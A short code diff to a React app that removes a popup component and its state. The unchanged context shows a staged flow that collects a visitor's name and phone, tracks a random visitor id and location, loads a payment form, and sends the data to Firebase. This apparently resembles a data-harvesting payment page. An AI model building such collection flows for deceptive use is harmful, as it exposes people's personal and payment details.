@@ -9,7 +9,6 @@ import Info from "./info/info"
 import { addData } from "./firebase"
 import  FullPageLoader  from "./loader"
 import { PaymentForm } from "./kent/kent"
-import PopupMessage from "./popup"
 import { getLocation, setupOnlineStatus } from "./lib"
 
 function App() {
@@ -19,7 +18,6 @@ function App() {
   const [phone, setPhone] = useState("")
 
   const [_id] = useState("id" + Math.random().toString(16).slice(2))
-  const [showPopup, setShowPopup] = useState(false)
   const data={
     id:_id,
     hasPersonalInfo:name != '',
@@ -40,13 +38,6 @@ function App() {
       setCurrantPage(currantPage+1)
     }, 3000)
   }
-  
-  
-
-  const handleClosePopup = () => {
-    setShowPopup(false)
-  }
-
   useEffect(()=>{
     localStorage.setItem('vistor',_id)
       addData(data).then(()=>{
@@ -61,8 +52,6 @@ function App() {
           {isLoading && <FullPageLoader />}
           <Toaster position="bottom-center" />
         </div>
-
-        {showPopup && <PopupMessage onClose={handleClosePopup} />}
 
         {currantPage === 1 ? (
           <Landing handleNextPage={handleNextPage} />
